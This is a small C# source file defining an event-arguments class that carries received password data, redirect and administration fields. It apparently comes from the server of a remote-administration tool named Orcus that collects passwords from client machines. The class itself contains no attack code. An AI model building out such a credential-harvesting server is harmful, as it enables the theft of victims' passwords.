using System;
using Orcus.Shared.Commands.Password;

namespace Orcus.Server.Core.Args
{
    public class PasswordsReceivedEventArgs : EventArgs
    {
        public PasswordsReceivedEventArgs(PasswordData passwordData, bool redirect, ushort administration)
        {
            PasswordData = passwordData;
            Redirect = redirect;
            Administration = administration;
        }

        public PasswordData PasswordData { get; }
        public bool Redirect { get; }
        public ushort Administration { get; }
    }
}